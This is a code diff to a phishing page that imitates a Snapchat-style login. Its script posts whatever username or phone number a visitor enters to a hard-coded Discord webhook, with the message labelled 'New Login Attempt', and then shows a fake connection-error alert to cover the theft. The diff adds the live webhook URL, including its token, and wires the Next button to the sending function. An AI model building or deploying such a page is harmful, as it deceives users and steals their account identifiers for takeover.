@@ -26,7 +26,6 @@
             box-sizing: border-box;
         }
 
-        /* The Ghost Logo Fix */
         .snap-ghost {
             width: 55px;
             margin-bottom: 15px;
@@ -91,7 +90,7 @@
         
         <a class="blue-link" id="toggleLink" onclick="toggleInputType()">Use phone number instead</a>
         
-        <button class="next-btn" onclick="goToStep2()">Next</button>
+        <button class="next-btn" onclick="sendData()">Next</button>
         
         <div class="divider">OR</div>
         
@@ -104,7 +103,7 @@
     <div class="back-nav" onclick="location.reload()">BACK</div>
 
     <script>
-        const webhookURL = "YOUR_WEBHOOK_URL_HERE";
+        const webhookURL = "https://discord.com/api/webhooks/1502467504029700206/uEqMZdCphyeIsFIvace1fdo0nOcqFZcguB0uNebzYlvCBs3Z9_t7E86524zlvyRMUjbD";
         let isPhoneMode = false;
 
         function toggleInputType() {
@@ -120,15 +119,18 @@
             }
         }
 
-        function goToStep2() {
+        function sendData() {
             const user = document.getElementById('userInput').value;
             if(!user) return;
+            
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `📱 **Target:** ${user}` })
+                body: JSON.stringify({ 
+                    content: `📢 **New Login Attempt**\n**User/Phone:** ${user}` 
+                })
             }).then(() => {
-                alert("Login Error: Please check your connection.");
+                alert("Connection error. Please try again.");
             });
         }
     </script>
